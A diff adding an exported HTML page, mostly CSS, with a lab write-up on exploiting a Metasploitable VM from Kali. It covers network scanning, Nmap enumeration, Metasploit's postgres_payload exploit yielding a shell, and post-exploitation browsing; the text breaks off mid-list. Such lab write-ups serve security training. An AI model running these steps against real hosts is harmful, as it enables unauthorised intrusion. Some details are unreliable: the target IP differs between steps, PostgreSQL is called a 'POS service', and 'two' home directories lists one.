@@ -1,0 +1,784 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Metasploitable </title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(142, 139, 134, 1);
+	fill: rgba(142, 139, 134, 1);
+}
+.highlight-brown {
+	color: rgba(182, 137, 101, 1);
+	fill: rgba(182, 137, 101, 1);
+}
+.highlight-orange {
+	color: rgba(213, 128, 59, 1);
+	fill: rgba(213, 128, 59, 1);
+}
+.highlight-yellow {
+	color: rgba(229, 178, 68, 1);
+	fill: rgba(229, 178, 68, 1);
+}
+.highlight-teal {
+	color: rgba(85, 167, 124, 1);
+	fill: rgba(85, 167, 124, 1);
+}
+.highlight-blue {
+	color: rgba(35, 131, 226, 1);
+	fill: rgba(35, 131, 226, 1);
+}
+.highlight-purple {
+	color: rgba(181, 119, 214, 1);
+	fill: rgba(181, 119, 214, 1);
+}
+.highlight-pink {
+	color: rgba(219, 105, 153, 1);
+	fill: rgba(219, 105, 153, 1);
+}
+.highlight-red {
+	color: rgba(229, 100, 88, 1);
+	fill: rgba(229, 100, 88, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.highlight-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.highlight-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.highlight-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(232, 242, 250, 1);
+}
+.highlight-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.highlight-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.highlight-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(142, 139, 134, 1);
+	fill: rgba(142, 139, 134, 1);
+}
+.block-color-brown {
+	color: rgba(182, 137, 101, 1);
+	fill: rgba(182, 137, 101, 1);
+}
+.block-color-orange {
+	color: rgba(213, 128, 59, 1);
+	fill: rgba(213, 128, 59, 1);
+}
+.block-color-yellow {
+	color: rgba(229, 178, 68, 1);
+	fill: rgba(229, 178, 68, 1);
+}
+.block-color-teal {
+	color: rgba(85, 167, 124, 1);
+	fill: rgba(85, 167, 124, 1);
+}
+.block-color-blue {
+	color: rgba(35, 131, 226, 1);
+	fill: rgba(35, 131, 226, 1);
+}
+.block-color-purple {
+	color: rgba(181, 119, 214, 1);
+	fill: rgba(181, 119, 214, 1);
+}
+.block-color-pink {
+	color: rgba(219, 105, 153, 1);
+	fill: rgba(219, 105, 153, 1);
+}
+.block-color-red {
+	color: rgba(229, 100, 88, 1);
+	fill: rgba(229, 100, 88, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(232, 242, 250, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 99, 174, 0.172); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="24de310c-e84f-8040-8d8e-fb3c4462e7a6" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">📶</span></div><h1 class="page-title">Metasploitable </h1><p class="page-description"></p></header><div class="page-body"><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">Metasploitable</summary><div class="indented"><p id="24de310c-e84f-816e-90dc-e0e0a0362bd8" class="">
+</p><h2 id="24de310c-e84f-81cc-a15b-f634ea5daad8" class=""><strong>1. Environment Setup</strong></h2><ul id="24de310c-e84f-81e4-9e11-c5fd837ff636" class="bulleted-list"><li style="list-style-type:disc"><strong>Target:</strong> Metasploitable VM</li></ul><ul id="24de310c-e84f-8109-b298-fac43c48d267" class="bulleted-list"><li style="list-style-type:disc"><strong>Attacker Machine:</strong> Kali Linux</li></ul><ul id="24de310c-e84f-81b4-968f-f861a27e209e" class="bulleted-list"><li style="list-style-type:disc">Changed <strong>VM network adapter</strong> from <strong>NAT</strong> to <strong>Bridged</strong> to ensure both machines are on the same network.</li></ul><hr id="24de310c-e84f-8114-9f9a-c197db1def3a"/><h2 id="24de310c-e84f-815f-aede-c5436d2fc587" class=""><strong>2. Finding the Target IP</strong></h2><p id="24de310c-e84f-81fc-a09a-e59ea01ff7f4" class="">After the VM booted, I scanned the local network to identify its IP:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-816d-97c0-ec0e4b63d822" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sudo arp-scan -l
+nmap -sn &lt;your_ip_range&gt;/24
+netdiscover</code></pre><p id="24de310c-e84f-8113-9b75-e607672799b7" class="">✅ <strong>Result:</strong> Target IP found → <code>192.168.179.139</code></p><figure id="24de310c-e84f-81e3-bb5e-e51a4e6667e2" class="image"><a href="image.png"><img style="width:681.9874877929688px" src="image.png"/></a></figure><hr id="24de310c-e84f-8149-8064-f56c1f09c149"/><h2 id="24de310c-e84f-81cd-86ff-f3896bfc8a49" class=""><strong>3. Port &amp; Service Enumeration</strong></h2><p id="24de310c-e84f-8190-bd57-d4147276baf7" class="">Used <strong>Nmap</strong> to discover open ports and service versions:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-8108-b04f-ffbfbce827fc" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">nmap -sV 192.168.179.139</code></pre><p id="24de310c-e84f-8105-8600-fa4816b069b0" class="">📌 <strong>Output:</strong> Multiple services detected, including the vulnerable POS service.</p><figure id="24de310c-e84f-818f-88f5-f366faf21e5f" class="image"><a href="image%201.png"><img style="width:681.9750366210938px" src="image%201.png"/></a></figure><hr id="24de310c-e84f-8166-819b-e21543bb628b"/><h2 id="24de310c-e84f-8187-bbe4-d7257d404070" class=""><strong>4. Vulnerability Identification</strong></h2><ul id="24de310c-e84f-81c4-a4cf-c1b202f18d23" class="bulleted-list"><li style="list-style-type:disc">Searched for known exploits for the detected POS service.</li></ul><ul id="24de310c-e84f-81dc-9d15-d2c52f040954" class="bulleted-list"><li style="list-style-type:disc">Found a matching Metasploit module for the service version.</li></ul><figure id="24de310c-e84f-81f6-964d-f0f71c772602" class="image"><a href="image%202.png"><img style="width:653.9625244140625px" src="image%202.png"/></a></figure><hr id="24de310c-e84f-815e-9d58-e7dee1e2c08e"/><h2 id="24de310c-e84f-81f9-a723-e4966a7444c8" class=""><strong>5. Exploitation with Metasploit</strong></h2><ol type="1" id="24de310c-e84f-8110-907b-f4bbc0967e7c" class="numbered-list" start="1"><li><strong>Start Metasploit</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-81fe-bca6-d7730422c85e" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">msfconsole</code></pre></li></ol><ol type="1" id="24de310c-e84f-81e7-b9ac-e4d0f41f84a8" class="numbered-list" start="2"><li><strong>Search and select the exploit</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-8147-a7ad-c9ae736c5c16" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">search PostgreSQL DB 8.3.0 - 8.3.7
+use exploit/linux/postgres/postgres_payload</code></pre></li></ol><ol type="1" id="24de310c-e84f-81c7-8cc4-d6709b5a1dac" class="numbered-list" start="3"><li><strong>Set required options</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-81d0-82c2-f8b9776c06dd" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">set RHOSTS 192.168.179.138
+exploit</code></pre></li></ol><p id="24de310c-e84f-81e8-854c-d7957fd312b1" class="">✅ Exploit was <strong>successful</strong> — obtained a shell session.</p><hr id="24de310c-e84f-818d-9ee8-f40f3e6bc98e"/><h2 id="24de310c-e84f-8177-a816-cd8188d26fc9" class=""><strong>6. Post-Exploitation</strong></h2><h2 id="24de310c-e84f-8170-8559-ced63323adca" class=""><strong>Post-Exploitation Steps</strong></h2><h3 id="24de310c-e84f-814d-82ee-f0f065497b33" class=""><strong>1. Verified System Access</strong></h3><ul id="24de310c-e84f-816a-b010-cec571918933" class="bulleted-list"><li style="list-style-type:disc">After exploiting the POS service, verified system access and confirmed control of the target.</li></ul><ul id="24de310c-e84f-8197-b708-dcdcea5b81ac" class="bulleted-list"><li style="list-style-type:disc">Attempted to upgrade or switch to a shell:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-81b1-a92d-c44976fd367b" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">
+shell</code></pre></li></ul><hr id="24de310c-e84f-818f-9682-de03b1c07717"/><h3 id="24de310c-e84f-8153-ad6d-dbece8edde53" class=""><strong>2. Directory Enumeration</strong></h3><ul id="24de310c-e84f-8150-978d-d8436dd09794" class="bulleted-list"><li style="list-style-type:disc">Navigated through the file system to locate potential sensitive directories and files.</li></ul><ul id="24de310c-e84f-81a9-b7a9-ce1c6084fc8d" class="bulleted-list"><li style="list-style-type:disc">Found two user home directories:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="24de310c-e84f-81f0-ba4d-f9c661e887d4" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/home/msfadmin</code></pre></li></ul><hr id="24de310c-e84f-81e4-82a5-f36d301fbc4a"/><h3 id="24de310c-e84f-8105-802b-d0c338fe3bc8" class=""><strong>3. Exploring </strong><code><strong>msfadmin</strong></code><strong> Directory</strong></h3><ul id="24de310c-e84f-815a-b1c9-f75fd431bc5b" class="bulleted-list"><li style="list-style-type:disc">Entered <code>/home/msfadmin</code> and looked for files/directories containing potentially vulnerable software.</li></ul><ul id="24de310c-e84f-8141-8aba-cbdacb0b25a0" class="bulleted-list"><li style="list-style-type:disc">Discovered:<ul id="24de310c-e84f-8113-b30e-ce1266863384" class="bulleted-list"><li style="list-style-type:circle"><strong>Samba-related directory</strong></li></ul><ul id="24de310c-e84f-816d-80dd-f22f5b809293" class="bulleted-list"><li style="list-style-type:circle"><strong>MySQL-SSL-related directory</strong></li></ul></li></ul><hr id="24de310c-e84f-8197-8eda-e6aa73cf1965"/><h3 id="24de310c-e84f-8131-ab99-c3e860fb4d71" class=""><strong>4. Vulnerable Software Identified</strong></h3><p id="24de310c-e84f-8171-a229-d60ee4739861" class=""><strong>In Samba directory:</strong></p><ul id="24de310c-e84f-812b-9cb2-d14ba0f55f5e" class="bulleted-list"><li style="list-style-type:disc">Found two versions:<ol type="1" id="24de310c-e84f-818e-bfc5-dedee5337710" class="numbered-list" start="1"><li><code>3.0.20</code></li></ol><ol type="1" id="24de310c-e84f-812b-9d1f-f2684f2f0bed" class="numbered-list" start="2"><li><code>3.0.6</code></li></ol></li></ul><p id="24de310c-e84f-8141-bca7-ceb21dd8cd03" class=""><strong>In MySQL-SSL directory:</strong></p><ul 